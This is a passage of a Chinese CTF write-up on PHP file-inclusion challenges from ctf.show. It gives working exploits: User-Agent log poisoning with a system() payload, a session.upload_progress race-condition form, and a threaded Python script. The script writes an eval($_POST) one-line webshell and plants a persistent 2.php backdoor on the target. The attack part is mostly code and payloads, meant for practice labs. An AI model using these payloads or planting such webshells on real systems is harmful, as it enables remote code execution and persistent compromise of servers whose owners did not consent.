<span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同上关类似，但本关过滤了<code>:</code>因此我们无法再使用伪协议，但仍可以借助日志包含漏洞来进行<br>构造payload如下即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span><span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>access<span class=\"token operator\">.</span>log<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>同时修改ua为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cat flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553197.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"文件包含实战（条件竞争）\"><a href=\"#文件包含实战（条件竞争）\" class=\"headerlink\" title=\"文件包含实战（条件竞争）\"></a>文件包含实战（条件竞争）</h2><h3 id=\"0X01-2\"><a href=\"#0X01-2\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>本关把<code>.</code>给ban了，那么只能够利用无后缀的文件，众所周知php中只有session文件是无后缀的，因此我们需要构造一个session文件，再用<code>session.upload_progress</code>将木马写入session文件，设置cookie可以自动初始化session文件，设置<code>cookie:PHPSESSID=flag</code>php就会在服务器上创建一个文件<code>/tmp/sess_flag</code>，这个文件的键值是<code>ini.get(&quot;session.upload_progress.prefix&quot;)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写到session中，那我们在<code>PHP_SESSION_UPLOAD_PROGRESS</code>中编写我们的恶意语句，就成功的写到了session中，我们的session文件是有了，但是接下来看这些php内置函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">session<span class=\"token operator\">.</span>auto_start <span class=\"token operator\">=</span> off\n<span class=\"token comment\">// 如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>enabled <span class=\"token operator\">=</span> on\n<span class=\"token comment\">// 默认开启这个选项，表示upload_progress功能开始，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>cleanup <span class=\"token operator\">=</span> on\n<span class=\"token comment\">// 默认开启这个选项，表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要。</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>prefix <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"upload_progress_\"</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"PHP_SESSION_UPLOAD_PROGRESS\"</span>\n<span class=\"token comment\">// 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在SESSION中获得。当PHP检测到这种POST请求时，它会在SESSION中添加一组数据（系统自动初始化session）, 索引是session.upload_progress.prefix与session.upload_progress.name连接在一起的值。</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>freq <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1%\"</span>\nsession<span class=\"token operator\">.</span>upload_progress<span class=\"token operator\">.</span>min_freq <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span>\n<span class=\"token comment\">// session.upload_progress.freq = \"1%\"+session.upload_progress.min_freq = \"1\"：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>当<code>session.upload_progress.cleanup = on</code>开启时，文件上传完会立即清除session文件中的内容，我们该怎么办呢，这时候就用到了文件竞争，一个POST传session，一个GET对session文件进行请求，两者同时进行就可以达到我们的目的，构造表单如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>html<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/\"</span> method<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"POST\"</span> enctype<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"multipart/form-data\"</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"PHP_SESSION_UPLOAD_PROGRESS\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"123\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"file\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n    <span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"submit\"</span> <span class=\"token operator\">/</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>随便传入个文件(为了配合PHP_SESSION_UPLOAD_PROGRESS)，然后抓包，修改cookie为PHPSESSID=flag，控制session文件名<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553271.png\" alt=\"在这里插入图片描述\">随便设置一个变量，要不然无法执行爆破<br>发送到爆破模块，在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下写入我们的恶意语句，此时设置payload为<code>null payloads</code>模式<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553441.png\" alt=\"在这里插入图片描述\">再抓一个靶场包，设置文件路径为<code>tmp/sess_flag</code>，在下方随便设置一个变量，方便爆破，payload设置同上，然后两个同时开启爆破，即可获取我们恶意语句的结果</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141553568.png\" alt=\"在这里插入图片描述\"></p>\n<p>参考文章<br><a href=\"https://www.freebuf.com/vuls/202819.html\">https://www.freebuf.com/vuls/202819.html</a><br><a href=\"https://www.cnblogs.com/chalan630/p/14147602.html\">https://www.cnblogs.com/chalan630/p/14147602.html</a></p>\n<h3 id=\"0X02-2\"><a href=\"#0X02-2\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>本关进去就提示了要求摧毁未初始化session的警告，我们发现相比上关多了两个函数，对函数介绍如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n释放当前在内存中已经创建的所有<span class=\"token variable\">$_SESSION</span>变量，但不删除session文件以及不释放对应的session\nid\n\n<span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n删除当前用户对应的session文件以及释放session<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看出这两个是完全将session给删除了，那我们只需要在表单构造时加上session_start()即可创建新的session文件，利用文件竞争同样可以达到目的，表单构造如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://9cb9ab98-2b0a-4259-98b1-fb1902156765.challenge.ctf.show/<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>PHP_SESSION_UPLOAD_PROGRESS<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>123<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里引用脚本(82-76通用)</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> io \n<span class=\"token keyword\">import</span> requests\n\nurl<span class=\"token operator\">=</span><span class=\"token string\">'http://e452861c-2e24-45d7-85cb-081b143cf342.challenge.ctf.show:8080/'</span><span class=\"token comment\">#传入url</span>\ndata<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"file_put_contents('/var/www/html/2.php','&lt;?php eval($_POST[2]);?>');\"</span> <span class=\"token comment\">#写入2.php文件，文件内容为一句话木马</span>\n    <span class=\"token punctuation\">&#125;</span>\nsessionid<span class=\"token operator\">=</span><span class=\"token string\">'quan9i'</span> <span class=\"token comment\">#传入session文件名</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#自定义写入session文件函数</span>\n    fileBytes<span class=\"token operator\">=</span>io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#括号内的b表示后面字符串是bytes类型。这里传入了50kb</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        response<span class=\"token operator\">=</span>session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>\n        data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'&lt;?php eval($_POST[1]);?>'</span><span class=\"token comment\">#传入的session文件中的内容为一句话木马</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span>sessionid <span class=\"token comment\">#文件名为sessionid，sessionid是quan9i，因此这里的文件名就是quan9i</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token string\">'quan9i.jpg'</span><span class=\"token punctuation\">,</span>fileBytes<span class=\"token punctuation\">)</span><span class=\"token comment\">#路径是quan9i.jpg文件，文件大小是50kb</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#printf(response)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#自定义读取session文件函数</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        response<span class=\"token operator\">=</span>session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'?file=/tmp/sess_'</span><span class=\"token operator\">+</span>sessionid<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span>cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token comment\">#这里写入tmp是为了包含session文件，session文件执行的的是1,1的参数对应的数据是写入文件2.php，文件2.php对应的内容是执行2</span>\n            <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span>sessionid <span class=\"token comment\">#读取路径是tmp/sess_quan9i</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span>\n        response2<span class=\"token operator\">=</span>session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'2.php'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> response2<span class=\"token punctuation\">.</span>status_code<span class=\"token operator\">==</span><span class=\"token number\">200</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#如果返回正常</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+++++++++++++++++YES+++++++++++++++++]'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response2<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span><span class=\"token comment\">#输出状态码</span>\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    event<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#五个进程</span>\n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>read<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    event<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#初始化</span>\n    <span class=\"token triple-quoted-string string\">'''\n    整体思路\n    首先写入url,我们需要往里面传入数据,所以我们这里data传入一个php文件,传到默认路径下，文件内容为一句话木马，为了\n    控制session文件名,我们设置sessionid为quan9i,此时开始定义写文件函数,首先需要写入一个在session文件中写入一个文件,大小\n    设置为50kb即可,之所以要写入文件是为了配合PHP_SESSION_UPLOAD_PROGRESS,这个东西是监测文件上传进度的，如果不传文件的话，\n    我们啥也监测不了，这个语句就有问题了,然后设置cookie为PHPSESSID=sessionid,\n    此时sessionid就是我们之前设置的quan9i,这时就确定了session文件的路径是/tmp/sess_quan9i,\n    此时我们监测的文件还没传，上方写入的文件需要传进去,我们传进去就可以了,此时可以printf(response)来查看响应进而确定是否成功写入文件\n    此时再自定义读文件,首先post包含我们的session文件,并设置cookie与之前相同,这个目的是为了执行session中的代码,session文件执行的是参数1,参数1在最上方对应\n    的是写入2.php文件,2.php文件对应的是执行参数2,\n    如果执行成功就输出+++YES+++,错误时返回状态码\n    '''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>为什么脚本可以用，是因为脚本使用了多线程竞争的方法。<br><font color='red'>什么是多线程竞争?</font><br>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</p>\n<p>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</p>\n<p>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)之间也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</p>\n<p>参考文章<br><a href=\"https://blog.csdn.net/qq_46918279/article/details/120106832\">https://blog.csdn.net/qq_46918279/article/details/120106832</a></p>\n<h3 id=\"0X03-1\"><a href=\"#0X03-1\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span 